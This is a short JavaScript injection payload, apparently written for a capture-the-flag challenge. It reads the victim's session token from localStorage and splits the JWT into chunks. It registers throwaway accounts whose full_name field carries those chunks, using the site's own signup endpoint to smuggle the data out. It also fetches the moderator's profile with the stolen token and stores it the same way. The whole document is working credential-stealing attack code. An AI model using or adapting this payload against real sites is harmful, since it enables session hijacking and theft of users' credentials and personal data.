(function () {
  var t = localStorage.getItem("token") || "NOTOKEN";
  function reg(uname, blob) {
    fetch("/api/register", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        username: uname, password: "flag123",
        email: uname + "@x.com",
        full_name: String(blob).slice(0, 240)   // stored field = our exfil buffer
      })
    });
  }
  // JWTs are long - chunk across two users
  reg("pe_tokA", "TOKA:" + t.slice(0, 230));
  reg("pe_tokB", "TOKB:" + t.slice(230));
  // also grab the moderator's identity
  fetch("/api/profile", { headers: { Authorization: "Bearer " + t } })
    .then(function (r) { return r.text() })
    .then(function (b) { reg("pe_prof", "PROF:" + b) });
})();
